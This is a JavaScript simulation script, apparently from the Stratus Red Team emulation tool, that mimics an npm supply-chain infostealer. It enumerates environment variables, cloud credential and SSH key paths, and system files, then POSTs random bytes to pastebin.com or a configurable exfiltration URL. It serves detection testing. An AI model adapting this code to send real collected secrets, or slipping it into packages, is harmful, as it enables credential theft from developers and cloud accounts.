/**
 * Stratus Red Team - Simulated Infostealer
 *
 * This script simulates the behavior of an infostealer by collecting system information.
 * It does NOT exfiltrate the collected data - only a blob of random data is sent to
 * demonstrate the network behavior.
 *
 * This runs from node_modules/malicious-package/ to simulate a supply chain attack
 * via a typosquatted or compromised npm package.
 */

const https = require("https");
const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const semver = require("semver");

const EXFIL_URL = process.env.EXFIL_URL || "https://pastebin.com";
const IP_HARVESTER_URL = process.env.IP_HARVESTER_URL || "https://ipinfo.io/ip";
const USER_AGENT = "stratus-red-team/2.0 (github.com/datadog/stratus-red-team)";
const OUTPUT_FILE = path.join(__dirname, "collected_info.json");

// Helper to make HTTP(S) GET requests
function httpGet(url) {
  return new Promise((resolve, reject) => {
    const client = url.startsWith("https") ? https : http;
    const req = client.get(
      url,
      { headers: { "User-Agent": USER_AGENT } },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(data.trim()));
      }
    );
    req.on("error", reject);
    req.setTimeout(10000, () => {
      req.destroy();
      reject(new Error("Request timeout"));
    });
  });
}

// Helper to make HTTP(S) POST requests
function httpPost(url, body) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const client = urlObj.protocol === "https:" ? https : http;

    const options = {
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === "https:" ? 443 : 80),
      path: urlObj.pathname + urlObj.search,
      method: "POST",
      headers: {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/octet-stream",
        "Content-Length": body.length,
      },
    };

    const req = client.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve({ statusCode: res.statusCode, body: data }));
    });
    req.on("error", reject);
    req.setTimeout(10000, () => {
      req.destroy();
      reject(new Error("Request timeout"));
    });
    req.write(body);
    req.end();
  });
}

// Check if a path exists
function pathExists(p) {
  try {
    fs.accessSync(p);
    return true;
  } catch {
    return false;
  }
}

// List files in a directory (non-recursive)
function listDir(dir) {
  try {
    return fs.readdirSync(dir);
  } catch {
    return [];
  }
}

// Collect external IP address
async function collectExternalIP() {
  console.log(`[*] Fetching external IP from ${IP_HARVESTER_URL}...`);
  try {
    const ip = await httpGet(IP_HARVESTER_URL);
    console.log(`[+] External IP: ${ip}`);
    return ip;
  } catch (err) {
    console.log(`[-] Failed to get external IP: ${err.message}`);
    return null;
  }
}

// Collect OS information
function collectOSInfo() {
  console.log("[*] Collecting OS information...");

  // Parse Node.js version using semver
  const nodeVersion = semver.parse(process.version);

  return {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    type: os.type(),
    arch: os.arch(),
    uptime: os.uptime(),
    totalMemory: os.totalmem(),
    freeMemory: os.freemem(),
    cpus: os.cpus().map((cpu) => ({ model: cpu.model, speed: cpu.speed })),
    networkInterfaces: os.networkInterfaces(),
    nodeVersion: nodeVersion
      ? {
          major: nodeVersion.major,
          minor: nodeVersion.minor,
          patch: nodeVersion.patch,
          raw: nodeVersion.raw,
        }
      : process.version,
    userInfo: (() => {
      try {
        return os.userInfo();
      } catch {
        return null;
      }
    })(),
  };
}

// Collect environment variables
function collectEnvVars() {
  console.log("[*] Collecting environment variables...");
  // Filter out some common sensitive patterns for display purposes
  const env = { ...process.env };
  return env;
}

// Check for cloud provider credentials
function collectCloudCredentials() {
  console.log("[*] Checking for cloud provider credentials...");
  const homeDir = os.homedir();

  const cloudPaths = {
    aws: [
      path.join(homeDir, ".aws"),
      path.join(homeDir, ".aws", "credentials"),
      path.join(homeDir, ".aws", "config"),
    ],
    azure: [
      path.join(homeDir, ".azure"),
      path.join(homeDir, ".azure", "credentials"),
    ],
    gcp: [
      path.join(homeDir, ".config", "gcloud"),
      path.join(homeDir, ".config", "gcloud", "credentials.db"),
      path.join(
        homeDir,
        ".config",
        "gcloud",
        "application_default_credentials.json"
      ),
    ],
    kubernetes: [
      path.join(homeDir, ".kube"),
      path.join(homeDir, ".kube", "config"),
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
    ],
    docker: [
      path.join(homeDir, ".docker"),
      path.join(homeDir, ".docker", "config.json"),
    ],
  };

  const results = {};
  for (const [provider, paths] of Object.entries(cloudPaths)) {
    results[provider] = {};
    for (const p of paths) {
      results[provider][p] = pathExists(p);
      if (results[provider][p]) {
        console.log(`[+] Found: ${p}`);
      }
    }
  }
  return results;
}

// Check for SSH keys
function collectSSHInfo() {
  console.log("[*] Checking for SSH keys...");
  const sshDir = path.join(os.homedir(), ".ssh");

  const result = {
    sshDirExists: pathExists(sshDir),
    files: [],
  };

  if (result.sshDirExists) {
    result.files = listDir(sshDir);
    console.log(
      `[+] Found SSH directory with files: ${result.files.join(", ")}`
    );
  }

  // Also check /etc/ssh for host keys
  const etcSshDir = "/etc/ssh";
  result.etcSshExists = pathExists(etcSshDir);
  if (result.etcSshExists) {
    result.etcSshFiles = listDir(etcSshDir).filter((f) => f.includes("key"));
  }

  return result;
}

// Collect process information
function collectProcessInfo() {
  console.log("[*] Collecting process information...");
  return {
    pid: process.pid,
    ppid: process.ppid,
    argv: process.argv,
    execPath: process.execPath,
    cwd: process.cwd(),
    uid: process.getuid ? process.getuid() : null,
    gid: process.getgid ? process.getgid() : null,
    groups: process.getgroups ? process.getgroups() : null,
  };
}

// Collect interesting files that might exist
function collectInterestingFiles() {
  console.log("[*] Checking for interesting files...");
  const files = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts",
  ];

  const results = {};
  for (const f of files) {
    results[f] = {
      exists: pathExists(f),
      readable: false,
      content: null,
    };
    if (results[f].exists) {
      try {
        // Only read small, non-sensitive files for the demo
        if (["/etc/hosts", "/etc/resolv.conf", "/proc/version"].includes(f)) {
          results[f].content = fs.readFileSync(f, "utf8").substring(0, 1000);
          results[f].readable = true;
        }
      } catch {
        results[f].readable = false;
      }
    }
  }
  return results;
}

// Attempt exfiltration with random data (NOT real collected data)
async function attemptExfiltration() {
  console.log(`\n[*] Attempting exfiltration to ${EXFIL_URL}...`);
  console.log(
    "[*] NOTE: Sending 1KB of random data, NOT the collected information"
  );

  // Generate 1KB of random data
  const randomData = crypto.randomBytes(1024);

  try {
    const result = await httpPost(EXFIL_URL, randomData);
    console.log(
      `[+] Exfiltration attempt completed with status: ${result.statusCode}`
    );
    return { success: true, statusCode: result.statusCode };
  } catch (err) {
    console.log(`[-] Exfiltration attempt failed: ${err.message}`);
    return { success: false, error: err.message };
  }
}

// Main function
async function main() {
  console.log("=".repeat(60));
  console.log("Stratus Red Team - Simulated Infostealer");
  console.log("Running from: " + __filename);
  console.log("=".repeat(60));
  console.log(`[*] EXFIL_URL: ${EXFIL_URL}`);
  console.log(`[*] IP_HARVESTER_URL: ${IP_HARVESTER_URL}`);
  console.log("");

  // Collect all information
  const collectedInfo = {
    timestamp: new Date().toISOString(),
    externalIP: await collectExternalIP(),
    osInfo: collectOSInfo(),
    envVars: collectEnvVars(),
    cloudCredentials: collectCloudCredentials(),
    sshInfo: collectSSHInfo(),
    processInfo: collectProcessInfo(),
    interestingFiles: collectInterestingFiles(),
  };

  // Save to JSON file
  console.log(`\n[*] Saving collected information to ${OUTPUT_FILE}...`);
  fs.writeFileSync(OUTPUT_FILE, JSON.stringify(collectedInfo, null, 2));
  console.log("[+] Information saved successfully");

  // Attempt exfiltration with random data (NOT the collected info!)
  const exfilResult = await attemptExfiltration();
  collectedInfo.exfiltrationAttempt = exfilResult;

  // Update the file with exfil result
  fs.writeFileSync(OUTPUT_FILE, JSON.stringify(collectedInfo, null, 2));

  console.log("\n" + "=".repeat(60));
  console.log("[+] Infostealer simulation complete");
  console.log("=".repeat(60));
}

main().catch((err) => {
  console.error("[-] Fatal error:", err);
  process.exit(1);
});
